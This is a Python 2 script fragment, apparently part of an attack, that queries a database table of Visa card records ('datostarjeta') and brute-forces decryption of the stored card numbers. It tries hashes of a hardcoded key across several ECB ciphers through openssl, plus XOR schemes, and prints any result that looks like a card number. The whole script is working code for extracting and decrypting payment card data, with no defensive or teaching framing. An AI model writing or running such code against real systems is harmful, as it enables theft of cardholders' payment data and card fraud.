
import subprocess,hashlib,ctypes,ctypes.util
KEY='8L84j3x3yZY894gyEwFNhDSPSrfyHf9WA'
K_MD5=hashlib.md5(KEY).hexdigest()
K_SHA1=hashlib.sha1(KEY).hexdigest()[:32]
K_SHA256=hashlib.sha256(KEY).hexdigest()
print 'K_MD5_16=%s'%K_MD5
print 'K_SHA1_16=%s'%K_SHA1
print 'K_SHA256=%s'%K_SHA256
rows=do_query(s,"SELECT id,HEX(FROM_BASE64(numero)) FROM datostarjeta WHERE tipo='Visa' ORDER BY id DESC LIMIT 3")
print 'Got %d rows'%len(rows)
for row in rows:
    rid=row[0]
    hx=row[1]
    raw=hx.decode('hex')
    ts=raw[:4].encode('hex')
    rep=raw[4:8].encode('hex')
    ct=raw[8:]
    cth=ct.encode('hex')
    print 'ID=%s ts=%s rep=%s ct=%s'%(rid,ts,rep,cth)
    f=open('/tmp/ct.bin','wb')
    f.write(ct)
    f.close()
    for kname,khex in [('md5',K_MD5),('sha1_16',K_SHA1),('sha256',K_SHA256)]:
        for cipher in ['aes-128-ecb','aes-256-ecb','bf-ecb','cast5-ecb']:
            klen=len(khex)//2
            if 'aes-256' in cipher and klen<32:continue
            if 'aes-128' in cipher and klen<16:continue
            if klen>16 and 'bf' in cipher:khex2=khex[:32]
            elif klen>16 and 'cast5' in cipher:khex2=khex[:32]
            else:khex2=khex
            cmd='openssl enc -%s -d -nosalt -nopad -K %s -in /tmp/ct.bin 2>&1'%(cipher,khex2)
            p=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            o,e=p.communicate()
            if p.returncode==0 and len(o)>0:
                nums=''.join(c for c in o if c.isdigit())
                if len(nums)>=12:
                    print '  HIT %s/%s: nums=%s hex=%s'%(kname,cipher,nums,o.encode('hex'))
    f2=open('/tmp/ct2.bin','wb')
    f2.write(raw[4:])
    f2.close()
    for kname,khex in [('md5',K_MD5),('sha1_16',K_SHA1)]:
        for cipher in ['bf-ecb','cast5-ecb','des-ede3-ecb']:
            cmd='openssl enc -%s -d -nosalt -nopad -K %s -in /tmp/ct2.bin 2>&1'%(cipher,khex[:32] if 'bf' in cipher or 'cast' in cipher else khex[:48])
            p=subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            o,e=p.communicate()
            if p.returncode==0 and len(o)>0:
                nums=''.join(c for c in o if c.isdigit())
                if len(nums)>=12:
                    print '  HIT20 %s/%s: nums=%s'%(kname,cipher,nums)
    repbyte=ord(raw[4])
    plain_xor=''.join(chr(ord(c)^repbyte) for c in ct)
    nums_xor=''.join(c for c in plain_xor if c.isdigit())
    if len(nums_xor)>=12:
        print '  XOR_REP HIT: nums=%s'%nums_xor
    plain_xor2=''.join(chr(ord(c)^ord(KEY[i%len(KEY)])) for i,c in enumerate(ct))
    nums_xor2=''.join(c for c in plain_xor2 if c.isdigit())
    if len(nums_xor2)>=12:
        print '  XOR_KEY HIT: nums=%s'%nums_xor2
    plain_xor3=''.join(chr(ord(c)^ord(KEY[i%len(KEY)])) for i,c in enumerate(raw[4:]))
    nums_xor3=''.join(c for c in plain_xor3 if c.isdigit())
    if len(nums_xor3)>=12:
        print '  XOR_KEY20 HIT: nums=%s'%nums_xor3
    print '---'
s.close()
